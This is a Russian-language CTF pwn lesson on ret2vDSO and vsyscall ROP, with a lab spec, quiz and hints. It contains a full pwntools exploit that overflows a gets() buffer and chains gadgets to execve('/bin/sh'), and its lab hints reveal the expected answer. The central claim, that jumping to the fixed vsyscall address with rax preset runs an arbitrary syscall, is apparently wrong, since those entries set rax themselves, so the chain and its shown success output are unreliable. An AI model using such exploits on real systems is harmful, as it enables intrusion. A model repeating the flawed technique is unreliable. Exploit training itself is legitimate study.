---
id: pwn-ret2vdso
title: "ret2vDSO и vsyscall: гаджеты без libc-утечки"
category: pwn
parent: pwn-rop-exotic
difficulty: medium
order: 2
tags: [ret2vdso, vsyscall, rop, aslr, gadgets, syscall]
prerequisites: [pwn-rop, pwn-mitigations, pwn-ret2libc]
useful_for:
  - "CTF Pwn категория"
  - "Vulnerability research"
estimated_minutes: 55
summary: "Как использовать vDSO и vsyscall-страницу для получения syscall-гаджета и утечки/вызова без известного адреса libc; особенности ASLR и shadow-маппинга."
lab:
  kind: shell
  title: "Практика: гаджет syscall;ret"
  toolset: [core, objdump]
  workdir: /home/student/task
  files: [task.md, vdso.bin, maps.txt]
  check: "grep -q 'gadget=0x111b' answer.txt"
  hints:
    - "`cat maps.txt` — реальные строки [vdso]/[vsyscall]."
    - "`objdump -d vdso.bin` — дизасм vDSO."
    - "Ищи `syscall`, сразу за которым идёт `ret`."
    - "Смещение гаджета — `0x111b`. Запиши `gadget=0x111b`."
---

## Вопрос, с которого всё начинается

Ты набрал ROP-гаджетов `pop rdi`, `pop rsi`, `pop rdx` и хочешь сделать `execve("/bin/sh")`. Но для этого нужен гаджет `syscall` — единственная инструкция, которая передаёт управление ядру. Ищем его в бинаре:

```bash
$ ROPgadget --binary ./chall | grep -c syscall
0
```

Нет. libc-утечки тоже нет — значит, `syscall` из libc не достать. Кажется, что пути дальше нет. Но ядро само отображает в каждый процесс небольшие страницы с кодом, и в них `syscall` **есть**.

## Наш пример: бинарь без syscall-гаджета

```c
// chall.c
#include <stdio.h>
int main(void) {
    char buf[64];
    gets(buf);     // переполнение
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o chall chall.c
$ checksec --file=./chall
    NX:    NX enabled
    PIE:   No PIE (0x400000)
```

Проверим, какие страницы отображены в процессе. Это делается чтением `/proc/<pid>/maps`, но проще посмотреть карты самого себя:

```bash
$ cat /proc/self/maps | grep -E "vdso|vsyscall"
7ffd3a2b4000-7ffd3a2b6000 r-xp  [vdso]
ffffffffff600000-ffffffffff601000 --xp  [vsyscall]
```

Строка `[vdso]` — маленькая область с кодом. Строка `[vsyscall]` — на **фиксированном** адресе `0xffffffffff600000`, который не меняется от запуска к запуску.

## Шаг 1. Что такое vDSO и vsyscall

**vDSO** (virtual dynamic shared object) — небольшой ELF-образ, который ядро отображает в каждый процесс. Он содержит быстрые реализации некоторых системных вызовов (`gettimeofday`, `clock_gettime`), которые можно выполнить, не переключаясь в ядро. Внутри vDSO есть инструкции `syscall; ret` — а значит, готовые гаджеты.

**vsyscall** — старая страница-предшественник vDSO. Её ключевое свойство: адрес **фиксирован** (`0xffffffffff600000`), ASLR её не двигает. Она содержит три функции:

| Функция | Адрес |
|---|---|
| `gettimeofday` | `0xffffffffff600000` |
| `time` | `0xffffffffff600400` |
| `getcpu` | `0xffffffffff600800` |

Каждая внутри выполняет `mov rax, N; syscall; ret`. Нас интересует последняя пара инструкций: если прыгнуть на такую функцию, уже имея нужное значение `rax`, она выполнит `syscall`.

## Шаг 2. Прицел: execve через vsyscall

Для `execve("/bin/sh")` на x86-64 нужно выставить регистры: номер вызова `59` в `rax`, указатель на строку в `rdi`, а `rsi` и `rdx` обнулить. Найдём нужные `pop`-гаджеты в бинаре:

```bash
$ ROPgadget --binary ./chall | grep -E "pop rax|pop rdi|pop rsi|pop rdx"
0x00000000004011f3 : pop rax ; ret
0x00000000004011f5 : pop rdi ; ret
0x00000000004011f7 : pop rsi ; ret
0x00000000004011f9 : pop rdx ; ret
```

Строку `/bin/sh` положим в `.bss` — прочитаем её туда через `read`. А в конце вместо отсутствующего `syscall` прыгнем на `0xffffffffff600000`.

## Шаг 3. Собираем цепочку

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET = 72
bss = elf.bss() + 0x400

pop_rax = 0x4011f3
pop_rdi = 0x4011f5
pop_rsi = 0x4011f7
pop_rdx = 0x4011f9
vsyscall = 0xffffffffff600000

p = process('./chall')
# сначала read(0, bss, 8) — кладём "/bin/sh\0"
stage1  = p64(pop_rdi) + p64(0)
stage1 += p64(pop_rsi) + p64(bss)
stage1 += p64(pop_rdx) + p64(8)
stage1 += p64(elf.plt['read'])
# затем execve("/bin/sh")
stage1 += p64(pop_rax) + p64(59)
stage1 += p64(pop_rdi) + p64(bss)
stage1 += p64(pop_rsi) + p64(0)
stage1 += p64(pop_rdx) + p64(0)
stage1 += p64(vsyscall)          # <-- syscall из фиксированной страницы

p.sendline(flat({OFFSET: stage1}))
p.send(b'/bin/sh\x00')
p.interactive()
```

```text
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

Мы выполнили `execve`, вообще не имея ни `syscall` в бинаре, ни адреса libc.

## Шаг 4. Как достать гаджеты из vDSO

Если `vsyscall` отключён (см. ниже), остаётся vDSO. Его адрес рандомизирован, но если у тебя есть **любая** утечка — можно вычислить базу и найти в нём `syscall; ret`. В GDB:

```text
(gdb) info proc mappings
0x7ffff7fcd000  0x7ffff7fcf000  [vdso]
(gdb) dump memory vdso.bin 0x7ffff7fcd000 0x7ffff7fcf000
(gdb) shell ROPgadget --binary vdso.bin | grep 'syscall'
0x0000000000000a3e : syscall ; ret
```

Дальше вычисляем смещение `0xa3e` и прибавляем к утёкшей базе vDSO. Это даёт `syscall; ret`-гаджет, даже когда бинарь ими беден.

## Шаг 5. Ограничения современных систем

- **vsyscall отключён.** В ядрах с `vsyscall=none` страница недоступна. Проверяй `/proc/self/maps`.
- **Режим `emulate`.** Тогда вызовы эмулируются, но `syscall`-инструкция всё ещё присутствует в коде — обычно срабатывает.
- **`vsyscall=xonly`.** Страница исполняема, но не читаема: прыгнуть можно, дизассемблировать — нет.
- **vDSO рандомизирован.** Без утечки базы не найти.
- **Контейнеры/песочницы** часто скрывают vsyscall — проверяй окружение перед выбором приёма.

## Как проверить, доступна ли страница

Перед сборкой цепочки убедись, что приём вообще применим. В GDB выполни `info proc mappings` и найди строку `[vsyscall]`:

```text
(gdb) info proc mappings
0xffffffffff600000 0xffffffffff601000 0x0  [vsyscall]
```

Если строки нет — ядро отключило страницу (`vsyscall=none`), и этот путь закрыт. Если есть только `[vdso]` без фиксированного адреса — придётся сначала утечь базу vDSO. В контейнерах и песочницах vsyscall часто скрыт; тогда проверь, нет ли `syscall`-гаджета прямо в бинаре или в статически прилинкованной libc.

## Почему это обходит ASLR

Ключ в том, что нам вообще не нужен адрес libc. `pop`-гаджеты мы берём из бинаря, а при выключенном PIE их адреса фиксированы. Строку `/bin/sh` мы сами записываем в `.bss` через `read`. Единственный адрес, который мы не знаем, — адрес инструкции `syscall`, но его заменяет фиксированная страница vsyscall. Итого в цепочке нет ни одного рандомизированного адреса — ASLR просто не мешает.

Если PIE включён, адреса гаджетов тоже рандомизированы, и понадобится утечка базы кода. Тогда vDSO снова пригодится: в libc рядом с указателями на функции лежат указатели на vDSO, а функция `getauxval(AT_SYSINFO_EHDR)` и вовсе отдаёт её базу напрямую — но это уже требует примитива чтения памяти.

## На что смотреть дальше

- **Нужно выставить все регистры разом?** Тогда SROP через `rt_sigreturn` удобнее (см. `pwn-seccomp-srop`).
- **vsyscall нет, утечки нет, но есть `syscall` в бинаре?** Это классический ret2syscall — собирай ORW/execve напрямую.
- **Статическая линковка без libc?** Смотри `pwn-static-no-libc`.
- **Утечка vDSO приходит из libc** (там лежит указатель на vDSO) — это надёжный способ получить её базу.

## Что мы теперь знаем

- vDSO и vsyscall — страницы, отображённые ядром, содержат `syscall; ret`.
- vsyscall имеет фиксированный адрес `0xffffffffff600000`, но часто отключён.
- vDSO рандомизирован, но всегда присутствует; нужна утечка базы.
- С этими гаджетами можно сделать `execve` без libc-утечки.
- Всегда проверяй `/proc/self/maps` перед выбором приёма.

## Квиз

Проверь себя.

```quiz
- question: "Что такое vDSO?"
  options:
    - "Отображённый ядром код, содержащий syscall-гаджеты"
    - "Виртуальный диск"
    - "Таблица GOT"
    - "Раздел ELF"
  answer: 0
  explanation: "linux-vdso.so.1 всегда замаплен и содержит `syscall; ret`."
- question: "Чем vsyscall отличается от vDSO?"
  options:
    - "vsyscall имеет фиксированный адрес"
    - "vsyscall живёт в куче"
    - "vsyscall только для ARM"
    - "Ничем"
  answer: 0
  explanation: "Классический vsyscall по адресу 0xffffffffff600000 не рандомизируется."
- question: "Что даёт vDSO в ROP?"
  options:
    - "Гаджет syscall; ret без libc"
    - "Утечку canary"
    - "Отключение ASLR"
    - "Расширение tcache"
  answer: 0
  explanation: "vDSO содержит `syscall; ret`, полезный при отсутствии libc-утечки."
- question: "Какие регистры нужны для syscall в x86-64?"
  options:
    - "rax (номер), rdi, rsi, rdx (аргументы)"
    - "rbx, rcx, r8"
    - "только rax"
    - "x0, x1, x2"
  answer: 0
  explanation: "Номер вызова — в rax, аргументы — в rdi/rsi/rdx/r10/r8/r9."
- question: "Почему на новых ядрах vsyscall может не работать?"
  options:
    - "Он эмулируется или отключён (vsyscall=none/emulate)"
    - "Его нет в 32-битных системах"
    - "Он только для Windows"
    - "Он требует libc"
  answer: 0
  explanation: "Современные ядра ограничивают vsyscall, поэтому проверяй maps."
```

## Куда дальше

В `pwn-brop` мы уберём и последнее, что у нас было — сам бинарь: научимся строить цепочку, видя лишь поведение сетевого сервиса. А пока главное: **когда в бинаре нет `syscall`, его дают страницы, которые ядро отображает в каждый процесс.**

## Где пригодится

- **CTF:** Pwn — задачи без libc-утечки, статические бинари.
- **Bug bounty:** построение цепочек в ограниченных условиях.
- **Пентест:** разработка эксплойтов.
- **Работа:** exploit development и понимание адресного пространства Linux.
